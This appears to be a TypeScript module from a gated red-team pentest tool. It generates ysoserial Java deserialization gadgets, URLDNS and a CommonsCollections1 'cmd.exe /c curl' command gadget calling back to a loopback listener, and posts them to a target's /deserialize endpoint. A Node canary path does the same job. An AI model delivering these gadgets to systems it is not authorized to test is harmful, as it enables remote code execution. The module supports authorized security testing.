/**
 * Deserialization capability (RED_TEAM_BUILD_SPEC §6.8).
 *
 * Two complementary engines:
 *  - Java: ysoserial via the red-ysoserial bridge, with exact base64→bytes
 *    delivery (no binary payload through a UTF-8 string).
 *  - Node: Loam's existing OOB canary (`runDeserCases`) with a function-free
 *    negative baseline and a loopback witness, never a destructive gadget.
 */
import type { PentestFinding } from "../../tools/pentest.js";
import type { Evidence } from "../orchestrator.js";
import { nextEvidenceId } from "../orchestrator.js";
import { normalizeScope, scopedTransport, type RequestEvidence } from "../scope.js";
import { normalizeDeserCases, normalizeDeserValues, runDeserCases, type DeserCase, type DeserProof } from "../deserialization.js";
import { gate } from "./gate.js";
import { loadEngines } from "./engines.js";
import { openLabListener } from "./c2/labListener.js";
import type { RedCapability, RedCapabilityContext, RedHypothesis, RedValidation } from "./orchestrator/redOrchestrator.js";

/** Response markers that indicate the server deserialized our bytes. */
const DESER_MARKERS = [
  "ObjectInputStream", "readObject", "java.io.Serializable", "InvalidClassException",
  "ClassNotFoundException", "ObjectStreamException", "Serialization",
];

export interface DeserCapabilityOptions {
  /** Path to ysoserial.jar; explicit null disables the registry lookup. */
  jar?: string | null;
  /** Delivery endpoint path (default /deserialize). */
  path?: string;
  /** JSON field used by the Node OOB case (default: data). */
  field?: string;
  /** Fresh benign baseline for the Node negative control. */
  benignValue?: string;
  /** Marker strings proving deser handling (tests / custom labs). */
  markers?: string[];
  /** Java gadget delivery (default) or the existing Node OOB canary engine. */
  mode?: "java" | "node";
  /** Opt-in OOB command-gadget proof; destructive and approval-gated. */
  oob?: boolean;
  /** Loopback listener port; 0/undefined selects an ephemeral port. */
  oobPort?: number;
}

export function deserCapability(opts: DeserCapabilityOptions = {}): RedCapability {
  const mode = opts.mode ?? "java";
  const capabilityId = mode === "node" ? "red.deser.node" : "red.deser";
  return {
    id: capabilityId,
    applicable: (target) => /^https?:/i.test(target),
    hunt: async (target): Promise<RedHypothesis[]> => [
      {
        id: `HYP-DESER-${mode}-${target.length}`,
        capability: capabilityId,
        target,
        claim: mode === "node" ? "Node endpoint deserializes attacker-controlled bytes" : "Endpoint deserializes attacker-controlled bytes",
        rationale: mode === "node" ? "Existing OOB deserialization canary" : "ysoserial URLDNS gadget probe",
      },
    ],
    validate: async (hyp: RedHypothesis, ctx: RedCapabilityContext): Promise<RedValidation> =>
      mode === "node" ? validateNodeDeser(hyp, ctx, opts) : validateJavaDeser(hyp, ctx, opts),
  };
}

async function validateJavaDeser(hyp: RedHypothesis, ctx: RedCapabilityContext, opts: DeserCapabilityOptions): Promise<RedValidation> {
  const markers = opts.markers ?? DESER_MARKERS;
  // Explicit null disables the registry lookup (hermetic tests / no engines).
  const jar = opts.jar !== undefined ? opts.jar : (loadEngines()?.paths.ysoserialJar ?? null);
  if (!jar) {
    return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: "ysoserial not installed (run npm run red:engines)", evidence: [] };
  }
  if (opts.oob) return validateJavaOob(hyp, ctx, opts, jar);
  // URLDNS is the benign gadget: a DNS lookup only, no code execution.
  // It needs a well-formed URL (a bare hostname throws inside the gadget).
  const gen = await ctx.bridge("red-ysoserial", "gen", { jar, gadget: "URLDNS", cmd: "http://oob.red-lab.invalid/" });
  if (!gen.ok || !gen.text) {
    return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `ysoserial unavailable: ${gen.error?.message ?? "no payload"}`, evidence: [] };
  }
  const payload = Buffer.from(gen.text, "base64");
  if (!payload.length) {
    return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: "ysoserial returned an empty/invalid base64 payload", evidence: [] };
  }
  const url = `${hyp.target.replace(/\/+$/, "")}${opts.path ?? "/deserialize"}`;
  let result;
  try {
    result = await ctx.transport.request(url, {
      method: "POST",
      headers: { "content-type": "application/octet-stream" },
      body: payload,
    });
  } catch (err) {
    return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `delivery failed: ${(err as Error).message}`, evidence: [] };
  }
  const matched = markers.find((m) => result.body.includes(m));
  if (!matched) {
    return { hypothesisId: hyp.id, status: "refuted", claim: hyp.claim, detail: `delivery returned HTTP ${result.status} without a deser marker`, evidence: [] };
  }
  const evidence: Evidence[] = [
    {
      id: nextEvidenceId(),
      kind: "poc",
      at: new Date().toISOString(),
      poc: `POST ${url} (ysoserial URLDNS payload, ${payload.length} bytes)`,
      observed: `Response contains "${matched}" (HTTP ${result.status}) — the endpoint deserialized attacker-controlled bytes`,
    },
  ];
  const finding: Omit<PentestFinding, "id"> = {
    check: "red_deserialization",
    verdict: "finding",
    severity: "critical",
    title: "Insecure deserialization of user-controlled bytes",
    target: hyp.target,
    detail: evidence[0]!.observed!,
    remediation: "Never deserialize untrusted bytes; sign or validate payloads before deserialization, and pin safe gadget-free classpaths.",
  };
  return { hypothesisId: hyp.id, status: "confirmed", claim: hyp.claim, detail: evidence[0]!.observed!, evidence, finding };
}

/** Approval-gated OOB command-gadget proof using the loopback lab listener. */
async function validateJavaOob(hyp: RedHypothesis, ctx: RedCapabilityContext, opts: DeserCapabilityOptions, jar: string): Promise<RedValidation> {
  const url = `${hyp.target.replace(/\/+$/, "")}${opts.path ?? "/deserialize"}`;
  const decision = gate(url, { capability: "red.deser", verb: "write", destructive: true }, ctx.authz, { approval: ctx.approval });
  if (!decision.allow) {
    return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: decision.reason, evidence: [] };
  }
  const listener = await openLabListener({ port: opts.oobPort ?? 0, timeoutSec: 5, authzId: ctx.authz?.id ?? null, audit: ctx.audit, signal: ctx.signal });
  try {
    const callbackUrl = `http://127.0.0.1:${listener.port}/deser-oob`;
    const gen = await ctx.bridge("red-ysoserial", "gen", { jar, gadget: "CommonsCollections1", cmd: `cmd.exe /c curl -s ${callbackUrl}` });
    if (!gen.ok || !gen.text) {
      return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `ysoserial unavailable: ${gen.error?.message ?? "no payload"}`, evidence: [] };
    }
    const payload = Buffer.from(gen.text, "base64");
    if (!payload.length) {
      return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: "ysoserial returned an empty/invalid base64 payload", evidence: [] };
    }
    const result = await ctx.transport.request(url, {
      method: "POST",
      headers: { "content-type": "application/octet-stream", "x-red-oob": callbackUrl },
      body: payload,
    });
    const proof = await listener.callback;
    const evidence: Evidence[] = [
      {
        id: nextEvidenceId(),
        kind: "poc",
        at: proof.at,
        poc: `POST ${url} (CommonsCollections1, curl ${callbackUrl})`,
        observed: `OOB callback ${proof.path} from ${proof.remote} after deserialization (HTTP ${result.status})`,
      },
    ];
    const finding: Omit<PentestFinding, "id"> = {
      check: "red_deserialization",
      verdict: "finding",
      severity: "critical",
      title: "Deserialization achieved an OOB callback from the target",
      target: hyp.target,
      detail: evidence[0]!.observed!,
      remediation: "Never deserialize untrusted bytes; use data-only formats and verify signatures before deserialization.",
    };
    return { hypothesisId: hyp.id, status: "confirmed", claim: hyp.claim, detail: evidence[0]!.observed!, evidence, finding };
  } catch (err) {
    const message = (err as Error).message;
    return {
      hypothesisId: hyp.id,
      status: /callback timeout/.test(message) ? "refuted" : "inconclusive",
      claim: hyp.claim,
      detail: `OOB callback not observed: ${message}`,
      evidence: [],
    };
  } finally {
    listener.close();
  }
}

/** Reuse Loam's existing Node OOB deserialization canary and negative baseline. */
async function validateNodeDeser(hyp: RedHypothesis, ctx: RedCapabilityContext, opts: DeserCapabilityOptions): Promise<RedValidation> {
  const path = opts.path ?? "/deserialize";
  const scope = normalizeScope(hyp.target, { maxPages: 1, maxRequests: 10, delayMs: 0, timeoutSeconds: 30 });
  const deserCase = normalizeDeserCases(
    [{ id: "redDeserOob", path, field: opts.field ?? "data", benignRef: "baseline", templateRef: "template" } as DeserCase],
    scope,
    "campaign",
    [path],
  )[0]!;
  const secrets = normalizeDeserValues({ baseline: opts.benignValue ?? "home", template: "@LOAM_FUNC@" }, [deserCase]);
  const controller = new AbortController();
  ctx.signal?.addEventListener("abort", () => controller.abort(), { once: true });
  const requestEvidence: RequestEvidence[] = [];
  const transport = scopedTransport(scope, controller.signal, {}, requestEvidence);
  const result: { proofs: DeserProof[]; incomplete: boolean } = { proofs: [], incomplete: false };
  const published: { proof: DeserProof; findings: PentestFinding[] }[] = [];
  const gateTarget = new URL(deserCase.path, scope.seeds[0]!).href;

  try {
    await runDeserCases(
      {
        scope,
        secrets,
        auth: {},
        signal: controller.signal,
        evidence: requestEvidence,
        reserve: async () => {
          const decision = gate(gateTarget, { capability: "red.deser.node", verb: "write" }, ctx.authz, { requestCount: () => transport.count });
          if (!decision.allow) throw new Error(decision.reason);
          return transport.reserve();
        },
        redact: transport.redact,
        result,
        publish: (proof, findings) => published.push({ proof, findings }),
      },
      [deserCase],
    );
  } catch (err) {
    return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `Node OOB deserialization verification failed: ${(err as Error).message}`, evidence: [] };
  }

  const evidence: Evidence[] = [
    ...result.proofs.map((proof) => ({
      id: nextEvidenceId(),
      kind: "poc" as const,
      at: proof.at,
      poc: `Node deserialization OOB case ${proof.caseId}`,
      observed: proof.summary,
    })),
    ...requestEvidence.map((item) => ({
      id: nextEvidenceId(),
      kind: "request_response" as const,
      at: item.at,
      url: item.url,
      method: item.method,
      status: item.status,
      response: `HTTP ${item.status}; ${item.bytes} bytes; sha256 ${item.bodyHash}`,
    })),
  ];
  const first = published.flatMap((p) => p.findings)[0];
  if (first) {
    const { id: _engineId, ...finding } = first;
    return { hypothesisId: hyp.id, status: "confirmed", claim: hyp.claim, detail: first.detail, evidence, finding };
  }
  return {
    hypothesisId: hyp.id,
    status: result.incomplete ? "inconclusive" : "refuted",
    claim: hyp.claim,
    detail: result.proofs.map((p) => p.summary).join("; ") || "The canary never executed",
    evidence,
  };
}
